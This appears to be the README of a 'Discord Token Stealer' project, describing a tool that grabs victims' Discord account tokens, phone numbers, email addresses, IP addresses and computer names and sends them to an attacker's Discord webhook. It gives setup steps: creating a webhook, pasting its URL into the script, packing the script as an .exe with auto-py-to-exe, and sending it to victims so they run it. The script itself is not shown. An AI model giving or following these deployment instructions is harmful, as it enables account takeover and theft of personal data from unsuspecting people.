# Discord Token Stealer

This is an updated version of the old token stealer I had created almost a year ago. 

## Features
1. Discord account tokens
2. Phone Number
3. Email Address
4. IP and Computer Name

## Setup

Go to Discord, and create a fresh, new, server:

<img src='Screenshots/Create Server.png'>

Create a webhook within the general channel and copy the wehook url:

<img src='Screenshots/Webhook.png'>

You can customize the webhook within the script, or in Discord itself.

Once you have copied the URL, paste it where it says ``WEBHOOK_URL``, between the quotations.

Save the script, and overall, you are done. What you need to do now is to convert the ``.py`` script to an ``.exe``. It makes it easier for the victims to run the script.

### Converting to EXE

#### Installing using PyPI

Go to cmd and simply paste: 
``` 
$ pip install auto-py-to-exe 
```
Once complete, copy and paste:

```
$ auto-py-to-exe
```

A window will pop up prompting you to browse and select the file. 

![auto](https://user-images.githubusercontent.com/72026191/169677060-00f6998a-4f8c-4e35-bacd-f9d32fa98f67.png)    

Browse the script, name the .exe, and select ``Convert``

Once the conversion has completed, run the .exe, and a window will show, and eventually close after a few seconds. Go back to your discord server, and you will see that the webhook had sent all the desired information. It will show your info, because you had ran it. Giving this to another person, will grab their information, and to another, and so forth.

![hack](https://user-images.githubusercontent.com/72026191/169677624-75cb34fa-c8bd-4996-b261-7ed9064fa7f2.png)

Done! Just send this .exe to your victim, and make them run it, and you will get their information.


